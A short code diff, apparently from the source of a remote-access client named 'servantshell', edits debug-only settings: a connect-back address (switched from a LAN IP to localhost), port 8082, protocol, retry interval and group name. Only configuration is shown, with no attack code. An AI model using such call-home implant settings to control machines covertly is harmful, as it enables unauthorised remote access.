@@ -226,13 +226,13 @@ SHELL_API BOOL Init(BOOL bWait)
 
 	debugLog(_T("init servantshell. filepath is %s%s"), GetBinFilepath(), GetBinFilename());
 #ifdef _DEBUG
-	g_ConfigInfo.nDefaultCommType = COMMNAME_UDPS;
+	g_ConfigInfo.nDefaultCommType = COMMNAME_TCP;
 	g_ConfigInfo.nPort = 8082;
 	g_ConfigInfo.nFirstConnectHour = -1;
 	g_ConfigInfo.nFirstConnectMinute = -1;
 	g_ConfigInfo.nTryConnectIntervalM = 1;
 	strcpy_s(g_ConfigInfo.szGroups, sizeof(g_ConfigInfo.szGroups), "Default");
-	strcpy_s(g_ConfigInfo.szAddr, sizeof(g_ConfigInfo.szAddr), "192.168.50.150");
+	strcpy_s(g_ConfigInfo.szAddr, sizeof(g_ConfigInfo.szAddr), "127.0.0.1");
 
 	//	strcpy_s(g_CampInfo.szDllName, sizeof(g_CampInfo.szDllName), t2a(SERVANT_SHELL_BINNAME));
 // #else
